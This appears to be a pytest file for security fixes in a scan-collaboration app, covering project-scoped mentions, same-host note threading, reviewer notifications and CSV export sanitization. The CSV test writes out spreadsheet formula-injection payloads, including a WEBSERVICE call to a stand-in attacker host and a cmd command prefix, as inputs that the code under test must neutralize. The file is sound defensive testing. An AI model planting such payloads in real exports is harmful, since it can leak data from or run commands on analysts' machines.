"""Targeted tests for the v2.48.2 security fixes.

* H1 — ``parse_mentions`` scopes username resolution to the note's own
  project (was global, leaking Project A context to a Project B-only
  user).
* H2 — ``HostFollowService.create_note`` rejects a ``parent_id`` that
  points at a note on a different host (was unvalidated, letting a
  Project A note thread under a Project B note).
* H3 — ``_csv_safe`` neutralizes spreadsheet-formula prefixes so a
  malicious hostname / vuln title / scan filename can't run as a
  formula when an analyst opens the export.
"""

from __future__ import annotations

from datetime import datetime, timezone

import pytest


# ---------------------------------------------------------------------------
# H3 — pure-function tests
# ---------------------------------------------------------------------------


def test_csv_safe_prefixes_dangerous_starts():
    from app.services.csv_utils import csv_safe as _csv_safe

    # Each of the formula-injection prefixes Excel / LibreOffice treat
    # as a formula start.
    assert _csv_safe('=WEBSERVICE("https://attacker.tld/")') == (
        '\'=WEBSERVICE("https://attacker.tld/")'
    )
    assert _csv_safe("+1+1") == "'+1+1"
    assert _csv_safe("-cmd|/c calc") == "'-cmd|/c calc"
    assert _csv_safe("@SUM(A1:A2)") == "'@SUM(A1:A2)"
    assert _csv_safe("\tinjection") == "'\tinjection"
    assert _csv_safe("\rinjection") == "'\rinjection"


def test_csv_safe_passes_safe_values_through():
    from app.services.csv_utils import csv_safe as _csv_safe

    assert _csv_safe("nginx") == "nginx"
    assert _csv_safe("10.0.0.5") == "10.0.0.5"
    assert _csv_safe(443) == "443"
    assert _csv_safe(None) == ""
    # Embedded `=` later in the string is NOT a formula trigger — only
    # the first character matters to a spreadsheet, so leave it alone.
    assert _csv_safe("a=b") == "a=b"


# ---------------------------------------------------------------------------
# H2 — parent_id same-host validation
# ---------------------------------------------------------------------------


def _make_host(db_session, project, ip_address):
    from app.db import models

    host = models.Host(
        project_id=project.id,
        ip_address=ip_address,
        state="up",
        first_seen=datetime.now(timezone.utc),
        last_seen=datetime.now(timezone.utc),
    )
    db_session.add(host)
    db_session.flush()
    return host


def test_create_note_rejects_cross_host_parent_id(
    db_session, test_project, test_user
):
    """A parent_id that points at a note on a *different* host (and
    therefore potentially a different project) must be refused — that
    was the cross-project notification-injection path."""
    from app.services.host_follow_service import HostFollowService

    host_a = _make_host(db_session, test_project, "10.0.0.5")
    host_b = _make_host(db_session, test_project, "10.0.0.6")
    db_session.commit()

    svc = HostFollowService(db_session)
    parent = svc.create_note(host_b.id, test_user.id, "parent on host B")

    with pytest.raises(ValueError, match="same host"):
        svc.create_note(
            host_a.id, test_user.id, "child on host A", parent_id=parent.id
        )


def test_create_note_accepts_parent_on_same_host(
    db_session, test_project, test_user
):
    from app.services.host_follow_service import HostFollowService

    host = _make_host(db_session, test_project, "10.0.0.7")
    db_session.commit()

    svc = HostFollowService(db_session)
    parent = svc.create_note(host.id, test_user.id, "parent")
    child = svc.create_note(
        host.id, test_user.id, "child", parent_id=parent.id
    )
    assert child.parent_id == parent.id


def test_create_note_no_parent_id_works_unchanged(
    db_session, test_project, test_user
):
    """Parent-less notes (the common case) are unaffected by the new
    validation."""
    from app.services.host_follow_service import HostFollowService

    host = _make_host(db_session, test_project, "10.0.0.8")
    db_session.commit()

    note = HostFollowService(db_session).create_note(
        host.id, test_user.id, "standalone"
    )
    assert note.parent_id is None


# ---------------------------------------------------------------------------
# H1 — parse_mentions scoped to project membership
# ---------------------------------------------------------------------------


def _make_user(db_session, username):
    from app.db.models_auth import User, UserRole

    # Hash chosen by tests/conftest.py for its TEST_USER_PW_HASH; here
    # we just need a populated value so the column is non-null.
    user = User(
        username=username,
        email=f"{username}@example.com",
        full_name=username.title(),
        hashed_password="$2b$12$abcdefghijklmnopqrstuv",
        role=UserRole.MEMBER,
        is_active=True,
        created_at=datetime.now(timezone.utc),
    )
    db_session.add(user)
    db_session.flush()
    return user


def _make_membership(db_session, project, user, role="analyst"):
    from app.db.models_project import ProjectMembership

    mem = ProjectMembership(project_id=project.id, user_id=user.id, role=role)
    db_session.add(mem)
    db_session.flush()
    return mem


def test_parse_mentions_returns_only_project_members(
    db_session, test_project, test_user
):
    """Mention resolution must JOIN ProjectMembership so a username only
    active in *another* project is not returned."""
    from app.db.models_project import Project
    from app.services.notification_service import NotificationService

    # alice belongs to test_project; bob belongs only to other_project.
    alice = _make_user(db_session, "alice")
    bob = _make_user(db_session, "bob")
    _make_membership(db_session, test_project, alice)

    other_project = Project(
        name="other-project",
        slug="other-project",
        description="adversarial scope",
    )
    db_session.add(other_project)
    db_session.flush()
    _make_membership(db_session, other_project, bob)
    db_session.commit()

    svc = NotificationService(db_session)
    resolved = svc.parse_mentions(
        "@alice please look · @bob check this", project_id=test_project.id
    )
    usernames = {u.username for u in resolved}
    assert "alice" in usernames, "project member must be resolved"
    assert (
        "bob" not in usernames
    ), "non-member must NOT be resolved — would leak project context"


def test_parse_mentions_ignores_inactive_members(
    db_session, test_project
):
    from app.services.notification_service import NotificationService

    inactive = _make_user(db_session, "inactive_user")
    inactive.is_active = False
    _make_membership(db_session, test_project, inactive)
    db_session.commit()

    svc = NotificationService(db_session)
    resolved = svc.parse_mentions(
        "@inactive_user", project_id=test_project.id
    )
    assert resolved == []


def test_parse_mentions_empty_body_returns_empty():
    """Edge case — empty / mention-less body skips the DB query
    entirely."""
    from app.services.notification_service import NotificationService

    # No DB needed for the early-return paths.
    svc = NotificationService(db=None)
    assert svc.parse_mentions("", project_id=1) == []
    assert svc.parse_mentions("no mentions here", project_id=1) == []


def test_mention_notification_carries_host_id(db_session, test_project):
    """§21 — a mention notification records the host so the Activity mentions
    panel can deep-link to /hosts/<host_id>#note-<note_id> instead of a dead
    /hosts?note= link. (Both users are auto-id to avoid the test_user id=1
    sequence collision.)"""
    from app.db import models
    from app.services.notification_service import NotificationService

    author = _make_user(db_session, "noteauthor")
    mentionee = _make_user(db_session, "mentionee")
    _make_membership(db_session, test_project, mentionee)
    host = models.Host(project_id=test_project.id, ip_address="10.4.0.9", state="up")
    db_session.add(host)
    db_session.flush()
    note = models.Annotation(
        host_id=host.id, user_id=author.id, body="@mentionee take a look", note_type="finding",
    )
    db_session.add(note)
    db_session.flush()

    created = NotificationService(db_session).process_note_mentions(note, actor=author, project=test_project)
    db_session.flush()

    assert len(created) == 1
    assert created[0].host_id == host.id
    assert created[0].source_type == "note"
    assert created[0].source_id == note.id


def test_note_on_followed_host_notifies_reviewer_not_author(db_session, test_project):
    """A note on a host someone is reviewing alerts the reviewer (not the
    author); an already-@mentioned reviewer isn't pinged twice."""
    from app.db import models
    from app.db.models import HostFollow, FollowStatus
    from app.services.notification_service import NotificationService

    author = _make_user(db_session, "author3")
    reviewer = _make_user(db_session, "reviewer3")
    _make_membership(db_session, test_project, reviewer)
    host = models.Host(project_id=test_project.id, ip_address="10.8.0.1", state="up")
    db_session.add(host)
    db_session.flush()
    db_session.add(HostFollow(host_id=host.id, user_id=reviewer.id, status=FollowStatus.IN_REVIEW))
    note = models.Annotation(host_id=host.id, user_id=author.id, body="plain note", note_type="finding")
    db_session.add(note)
    db_session.flush()

    svc = NotificationService(db_session)
    created = svc.notify_host_followers_of_note(note, author, test_project)
    assert {n.user_id for n in created} == {reviewer.id}
    assert created[0].type == "host_note"
    assert created[0].host_id == host.id

    # The author never notifies themselves even if they follow the host.
    db_session.add(HostFollow(host_id=host.id, user_id=author.id, status=FollowStatus.REVIEWED))
    db_session.flush()
    again = svc.notify_host_followers_of_note(note, author, test_project)
    assert author.id not in {n.user_id for n in again}

    # A reviewer already @mentioned is excluded (no double ping).
    excluded = svc.notify_host_followers_of_note(
        note, author, test_project, exclude_user_ids={reviewer.id},
    )
    assert excluded == []


def test_scan_update_notifies_reviewer_of_updated_host_only(db_session, test_project):
    """A re-scan that UPDATES a followed host alerts its reviewer; a host the
    scan CREATED does not (it's new, nobody was reviewing it yet), and the
    uploader isn't alerted about their own scan."""
    from app.db import models
    from app.db.models import HostFollow, FollowStatus, HostScanHistory
    from app.services.notification_service import NotificationService

    uploader = _make_user(db_session, "uploader3")
    reviewer = _make_user(db_session, "reviewer4")
    _make_membership(db_session, test_project, reviewer)
    scan = models.Scan(project_id=test_project.id, filename="rescan.xml", tool_name="nmap")
    db_session.add(scan)
    db_session.flush()
    updated = models.Host(project_id=test_project.id, ip_address="10.8.0.2", state="up")
    created_host = models.Host(project_id=test_project.id, ip_address="10.8.0.3", state="up")
    db_session.add_all([updated, created_host])
    db_session.flush()
    db_session.add_all([
        HostFollow(host_id=updated.id, user_id=reviewer.id, status=FollowStatus.IN_REVIEW),
        HostFollow(host_id=created_host.id, user_id=reviewer.id, status=FollowStatus.REVIEWED),
        HostScanHistory(host_id=updated.id, scan_id=scan.id, host_created=False),
        HostScanHistory(host_id=created_host.id, scan_id=scan.id, host_created=True),
    ])
    db_session.flush()

    created = NotificationService(db_session).notify_followers_of_scan_update(
        scan_id=scan.id, actor_id=uploader.id,
    )
    assert len(created) == 1
    n = created[0]
    assert n.user_id == reviewer.id
    assert n.type == "scan_update"
    assert n.source_type == "scan" and n.source_id == scan.id
    # Exactly one updated host → deep-linkable to it.
    assert n.host_id == updated.id


def test_reviewed_records_no_conclusion_and_reopening_clears_a_stored_one(db_session, test_project):
    """Marking Reviewed stamps the reviewer's assignment and the review's date
    — and records NO conclusion: the write takes none (it was required until
    the owner's decision of 2026-10-10; this test pinned that it was stored).
    Re-opening to In Review still clears what an older review left, so a
    re-opened review does not carry an outcome that no longer stands."""
    import inspect

    from app.db import models
    from app.db.models import FollowStatus
    from app.services.host_follow_service import HostFollowService

    assert list(inspect.signature(HostFollowService.set_follow_status).parameters) == [
        "self", "host_id", "user_id", "status"]

    user = _make_user(db_session, "rev5")
    host = models.Host(project_id=test_project.id, ip_address="10.9.0.1", state="up")
    db_session.add(host)
    db_session.flush()

    svc = HostFollowService(db_session)
    reviewed = svc.set_follow_status(host.id, user.id, FollowStatus.REVIEWED)
    assert reviewed.status == FollowStatus.REVIEWED
    assert reviewed.review_conclusion is None
    assert reviewed.review_summary is None
    assert reviewed.reviewed_at is not None
    assert reviewed.assigned_at is not None  # reviewing = it's mine

    # A row as an older review left it.
    reviewed.review_conclusion, reviewed.review_summary = "finding_created", "promoted a finding"
    db_session.commit()
    again = svc.set_follow_status(host.id, user.id, FollowStatus.REVIEWED)
    assert (again.review_conclusion, again.review_summary) == ("finding_created", "promoted a finding")

    reopened = svc.set_follow_status(host.id, user.id, FollowStatus.IN_REVIEW)
    assert reopened.review_conclusion is None
    assert reopened.review_summary is None
    assert reopened.reviewed_at is None


def test_scan_update_skips_when_only_follower_is_uploader(db_session, test_project):
    from app.db import models
    from app.db.models import HostFollow, FollowStatus, HostScanHistory
    from app.services.notification_service import NotificationService

    uploader = _make_user(db_session, "uploader4")
    scan = models.Scan(project_id=test_project.id, filename="solo.xml", tool_name="nmap")
    db_session.add(scan)
    db_session.flush()
    host = models.Host(project_id=test_project.id, ip_address="10.8.0.4", state="up")
    db_session.add(host)
    db_session.flush()
    db_session.add_all([
        HostFollow(host_id=host.id, user_id=uploader.id, status=FollowStatus.IN_REVIEW),
        HostScanHistory(host_id=host.id, scan_id=scan.id, host_created=False),
    ])
    db_session.flush()

    created = NotificationService(db_session).notify_followers_of_scan_update(
        scan_id=scan.id, actor_id=uploader.id,
    )
    assert created == []


def test_scan_update_is_not_sent_to_people_no_longer_on_the_project(db_session, test_project):
    """Review 2026-10-10 H25: a review row outlives its reviewer's membership,
    and this notification alone did not ask who is on the project now — a
    removed or deactivated reviewer was sent the scan's file name.  The same
    re-scan tells each remaining reviewer once, with THEIR number of hosts,
    and the re-observed hosts are never bound as a list of ids."""
    from sqlalchemy import event

    from app.db import models
    from app.db.models import HostFollow, FollowStatus, HostScanHistory
    from app.services.notification_service import NotificationService

    uploader = _make_user(db_session, "uploader5")
    stayed = _make_user(db_session, "stayed")
    one_host = _make_user(db_session, "onehost")
    removed = _make_user(db_session, "removed")
    deactivated = _make_user(db_session, "deactivated")
    for user in (uploader, stayed, one_host, deactivated):
        _make_membership(db_session, test_project, user)
    deactivated.is_active = False
    scan = models.Scan(project_id=test_project.id, filename="client-dmz-rescan.xml", tool_name="nmap")
    db_session.add(scan)
    db_session.flush()
    hosts = [
        models.Host(project_id=test_project.id, ip_address=f"10.8.{i // 200}.{i % 200 + 1}", state="up")
        for i in range(120)
    ]
    db_session.add_all(hosts)
    db_session.flush()
    db_session.add_all(
        [HostScanHistory(host_id=h.id, scan_id=scan.id, host_created=False) for h in hosts]
        + [HostFollow(host_id=h.id, user_id=stayed.id, status=FollowStatus.REVIEWED) for h in hosts]
        + [HostFollow(host_id=h.id, user_id=removed.id, status=FollowStatus.IN_REVIEW) for h in hosts[:40]]
        + [HostFollow(host_id=h.id, user_id=deactivated.id, status=FollowStatus.IN_REVIEW) for h in hosts[:40]]
        + [HostFollow(host_id=hosts[7].id, user_id=one_host.id, status=FollowStatus.IN_REVIEW),
           HostFollow(host_id=hosts[8].id, user_id=uploader.id, status=FollowStatus.IN_REVIEW)]
    )
    db_session.flush()

    statements = []

    def record(_conn, _cursor, statement, parameters, _context, _many):
        statements.append((statement, parameters))

    bind = db_session.get_bind()
    event.listen(bind, "before_cursor_execute", record)
    try:
        created = NotificationService(db_session).notify_followers_of_scan_update(
            scan_id=scan.id, actor_id=uploader.id,
        )
    finally:
        event.remove(bind, "before_cursor_execute", record)

    told = {n.user_id: n for n in created}
    assert set(told) == {stayed.id, one_host.id}
    assert told[stayed.id].title.startswith("120 hosts") and told[stayed.id].host_id is None
    assert told[one_host.id].title.startswith("1 host ") and told[one_host.id].host_id == hosts[7].id
    assert all(n.project_id == test_project.id and n.source_id == scan.id for n in created)
    # No statement carried the re-observed hosts: none has anywhere near 120
    # bound values, whatever the number of hosts.
    assert statements and max(len(params or ()) for _sql, params in statements) < 20
